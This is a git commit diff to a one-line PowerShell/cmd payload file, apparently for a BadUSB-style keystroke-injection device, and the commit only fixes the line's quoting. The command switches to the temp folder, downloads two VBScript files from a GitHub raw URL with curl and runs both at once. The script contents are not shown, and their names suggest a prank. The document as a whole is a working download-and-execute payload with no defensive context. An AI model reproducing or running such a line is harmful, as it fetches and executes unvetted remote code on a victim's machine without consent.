002eaeaf2b6b46fdb5d1589f4bf4cda9e08d8089
Cabra <greencoder001@outlook.com>
2024-12-22 17:53:31 +0100

    Update dacommand.ps1

--- dacommand.ps1
+++ dacommand.ps1
@@ -1,1 +1,1 @@
-cmd /c ""cd %tmp% && curl https://raw.githubusercontent.com/GreenLab-Studios/notaducky/main/goodmusicplayer.vbs -o goodmusicplayer.vbs && curl https://raw.githubusercontent.com/GreenLab-Studios/notaducky/main/volup.vbs -o volup.vbs && start goodmusicplayer.vbs && start volup.vbs""
+cmd /c "cd %tmp% && curl https://raw.githubusercontent.com/GreenLab-Studios/notaducky/main/goodmusicplayer.vbs -o goodmusicplayer.vbs && curl https://raw.githubusercontent.com/GreenLab-Studios/notaducky/main/volup.vbs -o volup.vbs && start goodmusicplayer.vbs && start volup.vbs"
